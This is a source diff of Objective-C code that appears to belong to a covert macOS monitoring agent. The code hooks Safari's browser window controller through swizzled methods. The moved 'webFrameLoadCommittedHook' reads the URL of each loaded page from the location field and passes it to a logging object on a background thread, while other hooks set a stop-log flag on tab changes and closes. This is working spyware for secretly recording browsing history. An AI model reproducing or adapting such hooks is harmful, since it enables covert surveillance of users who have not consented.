@@ -552,13 +552,33 @@ void URLStartAgent()
 
 @implementation myBrowserWindowController
 
-- (void)didSelectTabViewItemHook
+- (void)webFrameLoadCommittedHook: (id)arg1
 {
+  [self webFrameLoadCommittedHook: arg1];
+  
 #ifdef DEBUG_URL
   infoLog(@"");
 #endif
-  gStopLog = 1;
-  [self didSelectTabViewItemHook];
+  
+  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
+  NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
+  
+  myLoggingObject *logObject = [[myLoggingObject alloc] init];
+  
+#ifdef DEBUG_URL     
+  NSLog(@"get _url: %@", _url);
+#endif
+  
+  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
+                           _agent, @"agent", nil];
+  
+  [NSThread detachNewThreadSelector: @selector(logURL:)
+                           toTarget: logObject
+                         withObject: urlDict];
+  
+  [logObject release];
+  [_agent release];
+  [_url release];
 }
 
 - (void)closeCurrentTabHook: (id)arg1
@@ -568,6 +588,15 @@ void URLStartAgent()
 #endif
   gStopLog = 1;
   [self closeCurrentTabHook: arg1];
+}
+
+- (void)didSelectTabViewItemHook
+{
+#ifdef DEBUG_URL
+  infoLog(@"");
+#endif
+  gStopLog = 1;
+  [self didSelectTabViewItemHook];
 }
 
 - (BOOL)_setLocationFieldTextHook: (id)arg1
@@ -609,35 +638,6 @@ void URLStartAgent()
   [_url release];
 
   return res;
-}
-
-- (void)webFrameLoadCommittedHook: (id)arg1
-{
-  [self webFrameLoadCommittedHook: arg1];
-  
-#ifdef DEBUG_URL
-  infoLog(@"");
-#endif
-  
-  NSNumber *_agent = [[NSNumber alloc] initWithInt: BROWSER_SAFARI];
-  NSString *_url              = [[self performSelector: @selector(_locationFieldText)] copy];
-  
-  myLoggingObject *logObject = [[myLoggingObject alloc] init];
-  
-#ifdef DEBUG_URL     
-  NSLog(@"get _url: %@", _url);
-#endif
-  
-  NSDictionary *urlDict = [[NSDictionary alloc] initWithObjectsAndKeys: _url, @"url", 
-                           _agent, @"agent", nil];
-  
-  [NSThread detachNewThreadSelector: @selector(logURL:)
-                           toTarget: logObject
-                         withObject: urlDict];
-  
-  [logObject release];
-  [_agent release];
-  [_url release];
 }
 
 @end
